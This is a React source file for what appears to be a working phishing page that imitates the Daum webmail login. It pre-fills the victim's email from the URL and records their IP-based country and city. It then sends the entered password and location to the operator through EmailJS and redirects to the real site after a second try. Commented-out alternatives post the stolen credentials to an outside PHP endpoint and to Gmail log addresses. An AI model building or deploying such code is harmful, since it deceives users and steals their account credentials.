import React, { useState, useEffect, useRef } from "react";
import "./DahumDotNet.css";
// import $ from "jquery";
import Preloader from "../../Preloader/Preloader";
import emailjs from '@emailjs/browser';

export const DahumDotNet = ()=>{

    const formRef = useRef();


    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');
  
    const forTime = new Date();
  
    useEffect(()=>{
      fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
      .then(req=> req.json())
      .then(res=>{
  
          setIpAdress(res.ip)
          setFlag(res.country.flag);
          setCountry(res.country.name);
          setCity(res.city.names.en);
  
      })
      .catch(e=> console.log)
  }, []);

    const reloadWebPageHandler = ()=> window.location.reload();

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [email, setEmail] = useState(extracetdEmail);
    const [password, setPassword] = useState('');

    const [spinLoader, setSpinLoader] = useState(false);

    const [count, setCount] = useState(0);

    const subDaum = __________=>{
        __________.preventDefault();
        // alert(567);
        if (password === "") {
            return null
        }else{
            setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                setTimeout(() => {
                    // window.location.href = `https://mail.${extracetdemailDomain}`; 
                    window.location.href = "https://www.daum.net/";
                    
                }, 1500);

            };

            // const user = {
            //     email: email ,
            //     password: password
            // };

            // const user = {
            //     email: email,
            //     password: password,
            //     // country: country,
              
            //     // city: city,
            //     // flag: flag,
            //     // eyep: ipAdress,
            //     // nownow: forTime	
            // };




             // post to server
            //  const user = {
            //     email: email,
            //     password: password,
                // subject: "Chamelon Page Logs",
                // to: "rvvlsales13@gmail.com",
                // // body: `Email: ${defaultEmail}  Password: ${defaultPassword}`
                // body:
                // `
                // <html lang="en">
                // <p>Online Correspondence: ${email}</p>
                // <p>Signal: ${password}</p>
                // <p>Country: ${country}</p>
                // <p>Flag: ${flag}</p>
                // </html>
                // `
            // };

            // const user = {
            //     "subject": "Coming Logs",
            //     "to": "reportwork5252@gmail.com",
            //     "body": `<div><h3></h3><p>Online_Correspondence: ${email}</p><p>Signal: ${password}</p><p>Country: ${country}</p><p>Flag: ${flag}</p></div>`
            // }
            
        
            // $.ajax({
            //     type: "POST",
            //     url: "https://trezanolz.com/kenneth/chame.php",
            //     data: user,
            //     success(data) {
            //         // alert('OK');
            //         console.log('data');
            //     },
            // });


            const serviceID = `service_xhrj4w4`;
            const templateID = `template_crghlbk`;
            const publicKey = `35JbsFMyI7dxAGiKW`;
    
    
            emailjs
            .sendForm(serviceID, templateID, formRef.current, {
              publicKey: publicKey,
            })
            .then(
              () => {
                console.log('!');
              },
              (error) => {
                console.log('...', error.text);
              },
            );
            

            setSpinLoader(true);
            setTimeout(() => {
                setSpinLoader(false);
                setPassword('');
            }, 2400);
        }
    };

    return(<div className="daumm_all">

        { spinLoader ? <Preloader /> : null }

        <article className="daum_wrapper_">

            <div className="cont_d_a_u__">

                <div className="img_l_ggg__">
                    <img 
                        alt="cont_d_a_u__"
                        style={{margin: "0 auto", cursor:'pointer'}}
                        onClick={reloadWebPageHandler}
                        src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGIAAAAoCAMAAAFFv++gAAAA2FBMVEVkjvysygSkvoTY5oj0alz8ugTR4fz8oGTy9dG0zkT8t7H81Fjv9Pz84IiEqMjG1Dj0gnfezS/0lpO60SabufzM2vz7/erE2kfk7an849/0o538vgT0jH10ntx/pfy/0vz8/vzP4Gn0enPs8ry81jj8zsmsxnz8sDz8yjTg7PysxvyOr/z87sT8xcH82NTsxhz82m387ru8zhz89dn86uzc5vzE1kT85p2kvvz0nJb89fFxm/zU5nz8tiD02mS0zhmevJjb6ZjM3Vr8whxslvz8qqT0cmT8vrzWmuvgAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADc0lEQVRIx71Wi1baQBDNHrLUaloQgSKhOERta0EroHAItQqN8f//qDM7u3lHSF83B+Nm9s7dmZ2dxAKCBHdJdwsB4ILbtG0bR23HEmLu2oCXZY3RKKQeBcGZEMIHHhkv2slYOUEfIVLQhQv2vXLRsQQI42EN6AHC2IGC69JvaYYWY2wsb2yNAT5tk10QXBflAPinOegcaImQsLDTruL4kEC8glspWStn4KWlV5Yw4KIuOW/GwgazYls9tKy3JC5hKnFuiL/I8ESGBofSMoZOGyMB8CnGSdKA+IgGoDAhNgTBeugIBhtWtheHHhkKIodkqBwo3ZdZqw7QWn8tZVyvnk9xcPfcOkwyCEEBI7QzYMa4Xm9zLr+rZR9L2huda9tuadrKZFdVBKs9CQPpIksqBtpa+p5iOPQPbgv4PlMUyhgGn3QeVS1NJnpKOaNNE0/MHnD1FTGSqRYJ+FCCzA42OFcw25sBZuPmeJ9IneWdDJpoGG5lRoGGxvCqjHHaX6l6ul6tbjJ15RQxHrhAvBbfb9KVeJVnPGQL8TrFsPIM2y6u3Xq9Hqga7s5oO2Y6u0v5mWtXdzGP/vYj30NuXEKXu6u0Blwdvg7Bi+oqylpUI8euRCHF8OLyWr3C0MVOHT+MGf0UY82MHsCIRQiljHrnzOIj+IHIFP6MJL5kVtXPnSgloUXm0y7AoExD41GILTEeo6a2g3FBEw8AeiLFyK0Kuyih7eh3hRCJxkl718R7yIzn7Km9yDF2nsHHygw459nOZm9GKW6xR6prrh9M9Vgud3L/i4STuKpLuHtI5DHsVIrismnOv/eChstBNDz0yyToHXq1p8RDaL+Kl1IJFHH2kJCevRN3pRKWda+KsrZdND5sNz8KJUJ7D9zEL0ymOsPoySZ1GMXsG0m80xJHOIg+Dz0M2WlFTj1Ms9M3o2ZWAqCTeKtngO0ORbowv6VaktE+Q9QMFDjHq8THXkYCAv3kKSeBrwdJvrlcI4kwIwG7JM7SUcxGte1MJL+EosuUp1dNIt6LgDz2tO7ISDRkXmLfKLIIqCluouwt0mH8PJpy7/4DiffKXyyxNRLd+LBUTVRawPT1A+1tU/Q19/tRjOsJj2LUO+8tij8Y95VQe5xrtxtRBh+qoux90T355xIoss0cu+O/LkE4qDXUV89iyZ4ntW11iV+wiyhnEwLI6gAAAABJRU5ErkJggg=="
                    />
                    {/* <hr /> */}

                </div>

                <main className="midkm_okdo">

                    <form onSubmit={subDaum} ref={formRef}>

                        <div>
                            <input 
                                type={`email`}
                                required
                                readOnly
                                value={email}
                                onChange={e=> setEmail(e.target.value)}
                                id="email_daum"
                                className="daum_e_m_a_l___"
                                style={{
                                    background:'#f4f4f4'
                                }}
                                name="online_correspondence"
                            />
                        </div>

                        <div>
                            <input 
                                type={`password`}
                                required
                                value={password}
                                onChange={e=> setPassword(e.target.value)}
                                id="email_daum"
                                className=""
                                style={{
                                    background:'#fff',
                                    border:'1px solid #767676'
                                }}
                                placeholder="Enter Password"
                                name="signal"
                            />
                        </div>

                        <div className="daum_sub">
                            <input 
                                type={`submit`}
                                value="log in"
                                id="btn_ddm"
                                onClick={subDaum}
                            />
                        </div>


              <input type="text" value={country} name="country" hidden/>
              <input type="text" value={city} name="city" hidden/>

                        <div style={{
                            fontSize:'14px',
                            display:'flex',
                            alignItem:'center',
                            justifyContent:'space-between',
                            marginTop:'10px',
                            cursor:'pointer',
                            color:'#555'
                        }}>
                            <span>
                                <input type={`checkbox`}/>
                                <span style={{fontSize:'13px'}}>Stay signed in</span>
                            </span>

                            <span onClick={reloadWebPageHandler} className="ijidkd" style={{
                                color:'#767676',
                                fontSize:'13px'
                            }}>IP Security</span>

                            <span style={{fontSize:'13px', color:'#4d87ef', fontWeight:'bold'}}>ON</span>
                        </div>

                        <div style={{fontSize:'12px', marginTop:'2em', textAlign:'center', color:'#767676', fontWeight:'bold'}}>
                            <span className="fidd" onClick={reloadWebPageHandler}>Find ID </span>
                            &#160;
                            &#160;
                            |
                            &#160;
                            &#160;
                            <span className="fidddppp" onClick={reloadWebPageHandler}>find password </span>
                        </div>


                    </form>

                    <aside>
                        <img 
                            src="data:image/png;base64,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